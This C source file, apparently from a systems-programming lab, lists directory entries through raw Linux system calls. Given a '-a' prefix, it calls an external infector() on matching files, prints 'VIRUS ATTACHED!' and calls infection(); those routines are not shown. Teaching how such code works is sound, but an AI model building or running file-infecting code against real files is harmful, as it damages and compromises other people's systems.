
#define SYS_EXIT 1
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#include "Util.h"
extern int system_call();
extern void infection();
extern void infector(char*);

#define DT_UNKNOWN 0
#define DT_FIFO 1
#define DT_CHR 2
#define DT_DIR 4
#define DT_BLK 6
#define DT_REG 8
#define DT_LNK 10
#define DT_SOCK 12
#define DT_WHT 1
#define SYS_getdents 141
#define O_DIRECTORY 0200000
#define O_RDONLY 0
struct linux_dirent {
    unsigned long  d_ino;
    int          d_off;
    unsigned short d_reclen;
    char           d_name[];
};

#define BUF_SIZE 8192

int main (int argc , char* argv[], char* envp[]){
    int fd;
    long nread;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    char d_type;
    long bpos;
    char* prefix = 0;
    int i;
    for(i = 0; i < argc; i++){
        if(strncmp(argv[i], "-a", 2) == 0){
            prefix = argv[i]+2;
            system_call(SYS_WRITE, STDOUT, argv[i]+2, strlen(argv[i]+2));
        }
    }

    fd = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY);
    if (fd == -1){
        system_call(SYS_EXIT, 0x55);
    }

        nread = system_call(SYS_getdents, fd, buf, BUF_SIZE);
        if (nread == -1){
            system_call(SYS_EXIT, 0x55);
        }

        for (bpos = 0; bpos < nread;) {
            d = (struct linux_dirent *) (buf + bpos);
            d_type = *(buf + bpos + d->d_reclen - 1);
            char* type = ((d_type == DT_REG) ?  " regular\n" :
                            (d_type == DT_DIR) ?  " directory\n" :
                            (d_type == DT_FIFO) ? " FIFO\n" :
                            (d_type == DT_SOCK) ? " socket\n" :
                            (d_type == DT_LNK) ?  " symlink\n" :
                            (d_type == DT_BLK) ?  " block dev\n" :
                            (d_type == DT_CHR) ?  " char dev\n" : "???");
                            
            if(prefix == 0){
                system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
                system_call(SYS_WRITE, STDOUT, type, strlen(type));
            } else if(strncmp(prefix, d->d_name, strlen(prefix)) == 0){
                system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED!\n", 17);
                infector(d->d_name);
            }
            bpos += d->d_reclen;
        }
    infection();
    return 0;
}
